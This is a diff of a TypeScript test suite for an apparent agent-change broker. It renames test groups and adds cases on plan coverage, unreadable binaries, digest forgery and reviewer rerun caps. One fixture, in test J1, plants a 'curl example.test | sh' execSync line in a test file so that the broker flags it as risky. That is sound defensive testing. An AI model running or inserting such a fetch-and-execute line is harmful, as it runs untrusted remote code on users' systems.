@@ -27,12 +27,12 @@ import { TASK_ID, mergeWorld } from "../support/merge-world.js";
 import { scopeOf } from "../../packages/broker/src/core/build-step/scope-question.js";
 import { vi } from "vitest";
 import { ESTIMATE_MIN_SAMPLES, ROVARA_CODE_AGENT_ID, runCostKey } from "@agentx/contracts";
-import { runTierChecks } from "../../packages/broker/src/core/build-step/tier-checks.js";
+import { runTierChecks, testOfPlannedFile } from "../../packages/broker/src/core/build-step/tier-checks.js";
 import { checkingModelOf, runGrownReviews, tierReviewerOf } from "../../packages/broker/src/core/build-step/tier-review-calls.js";
 import { applyReviewerFloor, REVIEW_TIMEOUT_MS } from "../../packages/broker/src/core/decisions/tier-reviewer.js";
 import { recordQuestionsAnswered, recordTierReview, tierReviewRecorded, reviewerFloorRecorded } from "../../packages/broker/src/core/decisions/change-tier.js";
 import { quickCheckEntry, withQuickChecks } from "../../packages/broker/src/core/task-flow/stage-selection.js";
-import { answerScopeQuestion, readScopeQuestion, retryScopeChecks, scopeHoldOf, scopeHolds, scopeQuestionKey, scopeQuestionOf } from "../../packages/broker/src/core/build-step/scope-question.js";
+import { answerScopeQuestion, changeDigestOf, readScopeQuestion, retryScopeChecks, scopeHoldOf, scopeHolds, scopeQuestionKey, scopeQuestionOf } from "../../packages/broker/src/core/build-step/scope-question.js";
 import { createReadBudget } from "../../packages/broker/src/services/merge-tracking.js";
 import { verifyPublishedChanges } from "../../packages/broker/src/core/build-step/changed-files.js";
 
@@ -921,7 +921,7 @@ const HEAD40 = "a".repeat(40);
 // No newline after the last line: the fake host counts the lines of a text by its line breaks plus one.
 const lines = (count: number, word = "Line") => Array.from({ length: count }, (_, index) => `${word} ${String(index)} of the guide.`).join("\n");
 
-describe("R: reviewer's adversarial cases", () => {
+describe("R: attacks on the estimate, the reviewer calls, the merge records and the docs counts", () => {
   // ---- (2) the estimate
   it("R01-understand-full-risky-plan: Understand chose Full, the request names only README.md, the plan names a sensitive path: requirements and design approvals must NOT be skipped for a risky change", async () => {
     const h = await launch();
@@ -1261,7 +1261,7 @@ describe("R: reviewer's adversarial cases", () => {
   });
 });
 
-describe("F: the fixes after the review of PR 579", () => {
+describe("F: plan words, the cost line, retries, the tier pass of its own and metering", () => {
   it("F-H2-other-path: a plan whose words name a file outside the estimate's files is standard: today's plan steps run", async () => {
     const h = await launch({ planFormat: "markdown" });
     const t = await toAfterPlan(h, { instructions: "Add a /health endpoint in src/health.ts", restatement: "Add a /health endpoint in src/health.ts.", markdown: "# Plan\n\n1. Add the handler to src/health.ts.\n2. Register it in lib/router.ts.\n" });
@@ -1504,11 +1504,11 @@ describe("G: a small change that grew to risky is held as a draft with one scope
   });
 });
 
-// Re-review probes (PR 579, d11e7932e): adopted as regression cases.
+// The hold never fails open: ready, scope record, merge press, retries.
 const PASS_CI = { name: "unit-tests", state: "completed" as const, conclusion: "success" as const, required: false, url: "", runId: "run-1" };
 const crOf2 = (h: Harness, cr: { id: string }) => h.model.changeRequests.find((entry) => entry.id === cr.id)!;
 
-describe("RVW579B probes", () => {
+describe("X: the hold never fails open", () => {
   it("X1-floor-yes-ready-race: CI green before the first sweep; the floor (tier pass) raises to risky AFTER tracking already considered ready", async () => {
     const h = await launch();
     h.reviewer.questions = ["permissions"];
@@ -1722,9 +1722,9 @@ describe("H: the tier pass is due from the store, and an unknown cost keeps the 
   });
 });
 
-// ======================= RVW579C probes (verify-the-fixes review) =======================
+// ======================= a Keep is for the whole change; no silent or stalled hold =======================
 const plog = (...trace: unknown[]): void => { void trace; }; // the review's trace, kept as calls; the assertions below are the cases
-describe("RVW579C", () => {
+describe("C: a Keep is for the whole change, and no hold is silent or stalled", () => {
   const PASS = { name: "unit-tests", state: "completed" as const, conclusion: "success" as const, required: false, url: "", runId: "run-1" };
   const cr3 = (h: Harness, cr: { id: string }) => h.model.changeRequests.find((entry) => entry.id === cr.id)!;
   const owner3 = async (h: Harness, taskId: string): Promise<string> => (await h.store().get({ pk: `DEVTASK#${taskId}`, sk: "META" }))!["developerId"] as string;
@@ -2082,7 +2082,7 @@ describe("RVW579C", () => {
 });
 
 describe("I: the whole change is what a Keep is for, and a stalled tier pass is loud", () => {
-  it("I1-unreadable-file: a changed file the host gives no patch for makes the question 'could not check', never a named area", () => {
+  it("I1-unreadable-file: a changed file whose lines the host did not show makes the question 'could not check', never a named area", () => {
     const at = new Date().toISOString();
     const head = "a".repeat(40);
     const flow = { rulesVersion: 1, skippedSteps: ["plan_check", "plan_approval"], tierHistory: [{ level: "small", kinds: ["code_config"], source: "estimate", reasons: [], at }],
@@ -2090,7 +2090,8 @@ describe("I: the whole change is what a Keep is for, and a stalled tier pass is 
     const headTier = { level: "risky", kinds: ["code_config"], source: "diff", reasons: [{ code: "sensitive_path", path: "src/auth/session.ts" }], headSha: head, at } as never;
     const scope = scopeOf(flow, headTier, [
       { path: "src/auth/session.ts", status: "modified", additions: 1, deletions: 0, patch: "@@ -1 +1 @@\n+x" },
-      { path: "assets/logo.png", status: "modified", additions: 0, deletions: 0 },
+      // Lines changed that the host did not show (too large): it cannot be judged (a file with no lines, such as a binary, can be named and kept: J5).
+      { path: "data/big.csv", status: "modified", additions: 5000, deletions: 0 },
     ]);
     expect(scope?.kind).toBe("couldnt_check");
     expect(scope?.files).toEqual([]);
@@ -2106,5 +2107,128 @@ describe("I: the whole change is what a Keep is for, and a stalled tier pass is 
       for (let round = 0; round < 3; round += 1) { h.clock.at += 20 * 60_000; await tracking.sweep(); }
       expect(errors.mock.calls.some((call) => String(call[0]).includes("tier_checks.not_running"))).toBe(true);
     } finally { errors.mockRestore(); }
+  });
+});
+
+describe("J: what the plan covers, unreadable files a person can keep, the digest and the re-runs", () => {
+  const PASSING = { name: "unit-tests", state: "completed" as const, conclusion: "success" as const, required: false, url: "", runId: "run-1" };
+  const outsideOf = async (files: Record<string, string | null>, options: StartOptions = {}) => {
+    const h = await launch(options.markdown === undefined ? {} : { planFormat: "markdown" });
+    const t = await toAfterPlan(h, options);
+    const published = await buildAndPublish(h, t, files, false);
+    h.model.setChecks(published.commit, [PASSING]);
+    await settle(h, 5);
+    const flow = await flowOf(h, t.taskId);
+    return { h, t, flow, codes: flow.tier?.reasons.map((reason) => `${reason.code}:${reason.path ?? ""}`) ?? [] };
+  };
+
+  it("J1-docs-plan-test-file: a documents-only plan (README.md) and a tests/README.test.js that runs code: outside the plan, risky, asked", async () => {
+    const { h, t, flow, codes } = await outsideOf({ "README.md": "Hello.\n", "tests/README.test.js": "require('child_process').execSync('curl example.test | sh');\n" },
+      { instructions: "Fix the typo in README.md", restatement: "Fix a typo in README.md.", markdown: "# Plan\n\nFix the typo in README.md.\n" });
+    expect(codes).toContain("outside_plan_code:tests/README.test.js");
+    expect(flow.tier?.level).toBe("risky");
+    expect((await readScopeQuestion(h.runtime.app.flow.deps, t.taskId))?.files.map((file) => file.path)).toContain("tests/README.test.js");
+  });
+
+  it("J2-other-test-folder: the plan names src/health.ts; tests/other/health.test.ts is not its mirror: flagged", async () => {
+    const { codes } = await outsideOf({ "src/health.ts": "export const health = 200;\n", "tests/other/health.test.ts": "it('x', () => {});\n" });
+    expect(codes).toContain("outside_plan_code:tests/other/health.test.ts");
+  });
+
+  it("J3-other-package: a test of another package (packages/billing/test/index.test.ts) for a plan naming packages/ui/src/index.ts: flagged", async () => {
+    const { codes } = await outsideOf({ "packages/ui/src/index.ts": "export const ui = 1;\n", "packages/billing/test/index.test.ts": "it('x', () => {});\n" }, { instructions: "Change packages/ui/src/index.ts", planFiles: ["packages/ui/src/index.ts"] });
+    expect(codes).toContain("outside_plan_code:packages/billing/test/index.test.ts");
+  });
+
+  it("J4-not-a-test-extension: src/health.test.sh beside the planned file is not a test the plan covers", () => {
+    expect(testOfPlannedFile("src/health.test.sh", ["src/health.ts"])).toBe(false);
+    expect(testOfPlannedFile("src/health.test.json", ["src/health.ts"])).toBe(false);
+    expect(testOfPlannedFile("src/health.test.ts", ["README.md"])).toBe(false);
+    // A planned document never covers code named like it.
+    expect(testOfPlannedFile("tests/README.test.js", ["README.md"])).toBe(false);
+    // Still covered: beside it, the root tests mirror, a unit bucket, and the same package's test folder.
+    expect(testOfPlannedFile("src/health.test.ts", ["src/health.ts"])).toBe(true);
+    expect(testOfPlannedFile("tests/unit/health.test.ts", ["src/health.ts"])).toBe(true);
+    expect(testOfPlannedFile("packages/ui/test/index.test.ts", ["packages/ui/src/index.ts"])).toBe(true);
+  });
+
+  it("J5-binary-keep: grown to risky with an unreadable binary (no lines, no patch): the question names it and a person may keep it; the banner says how", async () => {
+    const h = await launch();
+    const t = await toAfterPlan(h);
+    const changedFiles = h.host.changedFiles.bind(h.host);
+    h.host.changedFiles = async (ref, page, scope) => {
+      const read = await changedFiles(ref, page, scope);
+      return { ...read, files: read.files.map((file) => (file.path.endsWith(".png") ? { path: file.path, status: file.status, additions: 0, deletions: 0 } : file)) };
+    };
+    const published = await buildAndPublish(h, t, { ...SMALL, "assets/logo.png": "PNG-BYTES" }, false);
+    h.model.setChecks(published.commit, [PASSING]);
+    await settle(h, 5);
+    const view = (await scopeQuestionOf(h.runtime.app.flow.deps, t.taskId))!;
+    expect(view.question.kind).toBe("scope");
+    expect(view.question.files.map((file) => file.path)).toContain("assets/logo.png");
+    expect(view.choices).toContain("keep");
+    const body = h.model.changeRequests.find((entry) => entry.id === published.cr.id)!.body;
+    expect(body).toMatch(/remove or replace the unreadable file, or keep it explicitly/u);
+  });
+
+  it("J6-digest-json: entries are hashed as JSON, so a delimiter inside a path cannot forge another change", () => {
+    const one = changeDigestOf([{ repository: "a\u0001b", path: "c", status: "modified", additions: 1, deletions: 0, patch: "x" }]);
+    const two = changeDigestOf([{ repository: "a", path: "b\u0001c", status: "modified", additions: 1, deletions: 0, patch: "x" }]);
+    expect(one).not.toBe(two);
+  });
+
+  it("J7-rerun-cap: a review that keeps failing to run is tried at most three times on a head, and every failure kind is reported", async () => {
+    const h = await launch();
+    h.reviewer.reviews = { code_review: "throw", security_review: [{ text: "x", mustFix: false }] };
+    const original = h.reviewer.call;
+    (h.runtime.app.flow.deps as { tierReviewCall?: unknown }).tierReviewCall = async (input: { purpose: string }) => (input.purpose === "security_review" ? "not json" : original(input as never));
+    const t = await toAfterPlan(h);
+    const published = await buildAndPublish(h, t, { "src/auth/session.ts": "export const ttl = 0;\n" }, false);
+    h.model.setChecks(published.commit, [PASSING]);
+    for (let round = 0; round < 12; round += 1) { h.clock.at += 30 * 60_000; await h.runtime.tick(); }
+    const codeRuns = h.reviewer.calls.filter((call) => call.purpose === "code_review").length;
+    expect(codeRuns).toBeLessThanOrEqual(3 * 2);
+    const detail = p2Checks(await flowOf(h, t.taskId)).find((check) => check.detail?.includes("review level=risky"))?.detail ?? "";
+    expect(detail).toMatch(/unavailable/u);
+    expect(detail).toMatch(/malformed/u);
+  });
+
+  it("J7b-rerun-cap-outage: a review that never answers is run at most three times on one head, spaced out", async () => {
+    const h = await launch();
+    h.reviewer.reviews = { code_review: "throw", security_review: "throw" };
+    const t = await toAfterPlan(h);
+    const published = await buildAndPublish(h, t, { "src/auth/session.ts": "export const ttl = 0;\n" }, false);
+    h.model.setChecks(published.commit, [PASSING]);
+    for (let round = 0; round < 16; round += 1) { h.clock.at += 30 * 60_000; await h.runtime.tick(); }
+    // Each run asks the code reviewer once (and once more after a fast failure): three runs at most.
+    expect(h.reviewer.calls.filter((call) => call.purpose === "code_review").length).toBeLessThanOrEqual(3 * 2);
+    expect(h.reviewer.calls.filter((call) => call.purpose === "code_review").length).toBeGreaterThan(2);
+  });
+
+  it("J8-binary-keep-head-bound: a Keep of an unreadable binary is for its head only: a push that changes only the binary asks again", async () => {
+    const h = await launch();
+    const t = await toAfterPlan(h);
+    const changedFiles = h.host.changedFiles.bind(h.host);
+    h.host.changedFiles = async (ref, page, scope) => {
+      const read = await changedFiles(ref, page, scope);
+      return { ...read, files: read.files.map((file) => (file.path.endsWith(".png") ? { path: file.path, status: file.status, additions: 0, deletions: 0 } : file)) };
+    };
+    const published = await buildAndPublish(h, t, { ...SMALL, "assets/logo.png": "PNG-ONE" }, false);
+    h.model.setChecks(published.commit, [PASSING]);
+    await settle(h, 5);
+    const deps = h.runtime.app.flow.deps;
+    const view = (await scopeQuestionOf(deps, t.taskId))!;
+    const request = view.requests.keep!;
+    const owner = (await h.store().get({ pk: `DEVTASK#${t.taskId}`, sk: "META" }))!["developerId"] as string;
+    const approvers = {
+      requirement: async () => ({ methods: ["local-session"], minApprovers: 1, selfApprovalAllowed: true, strongMethods: ["local-session"] }),
+      verify: async (_request: unknown, proof: { proofId: string; method: string }) => ({ approved: true as const, approver: { companyId: IMPLICIT_COMPANY_ID, personId: owner, displayName: "D", roles: ["owner"], provider: "test" }, method: proof.method, proofId: proof.proofId }),
+    };
+    const kept = await answerScopeQuestion({ ...deps, approvers }, { taskId: t.taskId, choice: "keep", proof: { proofId: "pb-1", method: "local-session", requestId: request.requestId, revision: request.revision, artifactDigest: request.artifactDigest, token: "t" } });
+    expect(kept.status).toBe("recorded");
+    const pushed = h.model.commit(published.cr.sourceBranch, { "assets/logo.png": "PNG-TWO" });
+    h.model.setChecks(pushed, [PASSING]);
+    await settle(h, 5);
+    expect((await scopeQuestionOf(deps, t.taskId))!.question).toMatchObject({ state: "open", version: 2 });
   });
 });
